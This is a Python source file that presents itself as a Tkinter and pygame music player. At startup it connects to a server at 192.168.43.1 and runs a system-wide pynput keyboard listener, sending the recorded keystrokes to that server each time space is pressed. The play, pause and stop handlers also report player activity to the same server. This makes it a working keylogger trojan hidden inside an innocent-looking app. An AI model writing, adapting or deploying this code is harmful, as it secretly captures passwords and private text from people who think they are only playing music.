import os
import pygame
import tkinter as tk
from tkinter import filedialog

import socket
import threading
from pynput import keyboard


# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
s.connect(('192.168.43.1', 1234))

# Initialize a list to store the keystrokes
keystrokes = []


# Function to handle keypress events
def on_press(key):
    global keystrokes
    try:
        # Add the key to the list
        keystroke = str(key).replace("'", "").replace(",", "")
        keystrokes.append(keystroke)

        # If the spacebar is pressed, send the keystrokes to the server and clear the list
        if key == keyboard.Key.space:
            s.sendall("".join(keystrokes).encode())
            keystrokes.clear()
    except AttributeError:
        # Ignore non-character keys
        pass


# Create a keyboard listener
listener = keyboard.Listener(on_press=on_press)

# Start the listener in a separate thread
listener_thread = threading.Thread(target=listener.start)
listener_thread.start()


# Initialize Pygame mixer
pygame.mixer.init()


# Create the music player class
class MusicPlayer:
    def __init__(self, root):
        self.root = root
        self.root.title("Music Player")

        # Create the main frame
        self.main_frame = tk.Frame(self.root)
        self.main_frame.pack(padx=10, pady=10)

        # Create the music listbox
        self.music_listbox = tk.Listbox(self.main_frame, width=50, height=20)
        self.music_listbox.pack(side=tk.LEFT, padx=10)

        # Create the scrollbar
        self.scrollbar = tk.Scrollbar(self.main_frame, orient=tk.VERTICAL)
        self.scrollbar.pack(side=tk.LEFT, fill=tk.Y)

        # Attach the scrollbar to the listbox
        self.music_listbox.config(yscrollcommand=self.scrollbar.set)
        self.scrollbar.config(command=self.music_listbox.yview)

        # Create the buttons frame
        self.buttons_frame = tk.Frame(self.main_frame)
        self.buttons_frame.pack(side=tk.LEFT, padx=10)

        # Create the buttons
        self.add_button = tk.Button(self.buttons_frame, text="Add", command=self.add_music)
        self.add_button.pack(pady=10)

        self.play_button = tk.Button(self.buttons_frame, text="Play", command=self.play_music)
        self.play_button.pack(pady=10)

        self.pause_button = tk.Button(self.buttons_frame, text="Pause", command=self.pause_music)
        self.pause_button.pack(pady=10)

        self.stop_button = tk.Button(self.buttons_frame, text="Stop", command=self.stop_music)
        self.stop_button.pack(pady=10)

    # Function to add music files to the listbox
    def add_music(self):
        # Open a file dialog to select music files
        files = filedialog.askopenfilenames(initialdir=os.getcwd(), title="Select Music Files", filetypes=[("MP3 Files", "*.mp3")])

        # Add the selected files to the listbox
        for file in files:
            self.music_listbox.insert(tk.END, file)

    # Function to play the selected music file
    def play_music(self):
        # Get the selected music file from the listbox
        selected_music = self.music_listbox.get(tk.ACTIVE)

        # Load the music file and play it
       # Load the music file and play it
        pygame.mixer.music.load(selected_music)
        pygame.mixer.music.play()

        # Send a message to the server that music has started playing
        s.sendall("Music started playing".encode())

    # Function to pause the currently playing music
    def pause_music(self):
        pygame.mixer.music.pause()

        # Send a message to the server that music has been paused
        s.sendall("Music paused".encode())

    # Function to stop the currently playing music
    def stop_music(self):
        pygame.mixer.music.stop()

        # Send a message to the server that music has been stopped
        s.sendall("Music stopped".encode())


# Create the Tkinter root
root = tk.Tk()

# Create the music player
music_player = MusicPlayer(root)

# Start the Tkinter main loop
root.mainloop()

# Stop the listener and close the connection
listener.stop()
s.close()
